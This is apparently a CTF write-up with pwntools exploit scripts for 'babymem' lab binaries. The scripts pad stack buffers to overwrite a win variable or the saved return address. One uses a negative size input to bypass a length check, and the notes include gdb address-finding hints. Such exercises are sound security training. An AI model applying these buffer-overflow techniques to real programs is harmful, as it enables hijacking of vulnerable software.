# Pwn Beby mem

## 1.0 - 1.1
```py
from pwn import *                       
                                        
padding = b'A' * 176                    
payload = padding + p64(0x2dbba028)     
                                        
p = process('/challenge/babymem_level1.0')         
p.recvuntil('size:')                    
p.sendline('120')                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```

## 2.0 2.1
```py
from pwn import *                       
                                        
padding = b'A' * 528                    
payload = padding + p64(0xdeadbeef)     
                                        
p = process('/challenge/babymem_level2.0')         
p.recvuntil('size:')                    
p.sendline('530')                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```
Task: You can make this variable be non-zero by overflowing the input buffer.
The "win" variable is stored at 0x55c46aa5e8c0, 528 bytes after the start of your input buffer.

## 3.0 
```py
from pwn import *                       
                                        
padding = b'A' * 104                   
payload = padding + p64(0x4018d1) # win address
                                        
p = process('/challenge/babymem_level3.0')         
p.recvuntil('size:')                    
p.sendline('120')                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```
Task:
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe6e8fec28, 104 bytes after the start of your input buffer.
That means that you will need to input at least 112 bytes (73 to fill the buffer,
31 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

## 3.1
used gdb to locate buffer size from `challange` and `win` address

## 4.0
Task: In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffe4e15aa08, 88 bytes after the start of your input buffer.
That means that you will need to input at least 96 bytes (66 to fill the buffer,
22 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

```py
from pwn import *                       
                                        
padding = b'A' * 88                   
payload = padding + p64(0x401818)     
                                        
p = process('/challenge/babymem_level4.0')         
p.recvuntil('size:')                    
p.sendline('-66')  #jns jump if not signed (positive)                       
                                       
p.recvuntil('bytes)!')                  
p.send(payload)                         
p.interactive() 
```

## 4.1 
search jump address to `win`

## 6.0 - 6.1
Task: search `win_a...` function address using gdb `info func`, find `print` address and jump to it 